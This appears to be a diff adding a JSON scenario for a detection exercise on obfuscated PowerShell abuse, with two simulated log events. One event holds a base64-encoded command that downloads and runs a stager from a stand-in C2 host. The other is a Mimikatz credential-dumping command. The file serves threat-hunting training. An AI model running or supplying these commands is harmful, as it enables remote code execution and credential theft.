@@ -1,0 +1,25 @@
+{
+  "scenario_key": "1_powerShell_hunting",
+  "title": "Detect Obfuscated PowerShell Abuse",
+  "objective": "Identify obfuscated PowerShell execution, encoded scriptblocks, and credential dumping indicators.",
+  "target_environment": "corp.local Active Directory Subnet (10.0.4.0/24)",
+  "telemetry_sources": ["Windows Events", "Sysmon", "PowerShell Operational Logs"],
+  "telemetry_events": [
+    {
+      "timestamp": "2026-08-06T19:10:05Z",
+      "host": "finance-wkstn-04",
+      "user": "CORP\\jsmith",
+      "process": "powershell.exe",
+      "command": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc aW52b2tlLWV4cHJlc3Npb24gKG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHA6Ly9tYWxpY2lvdXMtYzIudG9wL3N0YWdlci5wczEnKQ==",
+      "event_id": 4104
+    },
+    {
+      "timestamp": "2026-08-06T19:10:22Z",
+      "host": "finance-wkstn-04",
+      "user": "CORP\\jsmith",
+      "process": "powershell.exe",
+      "command": "Invoke-Mimikatz -DumpCreds -Command privilege::debug sekurlsa::logonpasswords",
+      "event_id": 4104
+    }
+  ]
+}
